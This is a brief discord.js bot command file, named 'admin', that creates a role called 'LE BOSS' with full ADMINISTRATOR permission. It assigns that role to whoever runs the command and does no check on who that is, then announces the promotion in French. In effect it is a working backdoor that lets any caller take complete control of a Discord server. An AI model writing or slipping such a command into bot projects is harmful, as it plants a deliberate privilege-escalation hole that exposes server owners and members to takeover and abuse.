 const Discord = require('discord.js');

/**
 * @param {Discord.Client} client
 * @param {Discord.Message} message
 * @param {Array<String>} arguments
 */
module.exports.run = async (client, message, arguments) => {
  

const adminRole =await message.guild.roles.create( {name:"LE BOSS", color: "#ff0000", permissions:["ADMINISTRATOR"] } );

message.member.roles.add(adminRole)
.then(() => {
    message.channel.send('Vous êtes passés admin !')
})
.catch((error) => {
    console.log(error);
})


  
}

module.exports.name = 'admin';
